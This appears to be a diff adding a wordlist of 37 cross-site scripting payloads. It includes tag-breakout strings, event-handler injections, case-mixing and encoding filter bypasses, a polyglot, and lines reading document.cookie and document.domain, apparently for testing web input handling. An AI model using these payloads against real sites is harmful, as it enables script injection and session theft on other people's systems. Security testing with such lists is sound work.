@@ -1,0 +1,37 @@
+test<script>alert('XSS')</script>
+search'><script>alert('XSS')</script>
+artists"><script>alert('XSS')</script>
+";alert('XSS');//
+"><script>alert('XSS')</script>
+#<img src=x onerror=alert(1)>
+%3Cscript%3Ealert('XSS')%3C/script%3E
+';alert('XSS');//
+'><script>alert('XSS')</script>
+</script><script>alert('XSS')</script>
+<IMG SRC=x ONERROR=alert('XSS')>
+<ScRiPt>alert('XSS')</ScRiPt>
+<audio src onerror=alert('XSS')>
+<body onload=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<embed src=javascript:alert('XSS')>
+<iframe src=javascript:alert('XSS')>
+<img src="x" onerror="alert('XSS')">
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<input onfocus=alert('XSS') autofocus>
+<link rel=import href="javascript:alert('XSS')">
+<math href="javascript:alert('XSS')">click
+<object data=javascript:alert('XSS')>
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<select onfocus=alert('XSS') autofocus>
+<svg onload=alert('XSS')>
+<svg/onload=alert('XSS')>
+<video><source onerror=alert('XSS')>
+><img src=x onerror=alert(document.domain)>
+><script>alert('XSS')</script>
+><svg onload=alert(window.location)>
+jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
+javascript:alert('XSS')
+javascript:alert(document.cookie)
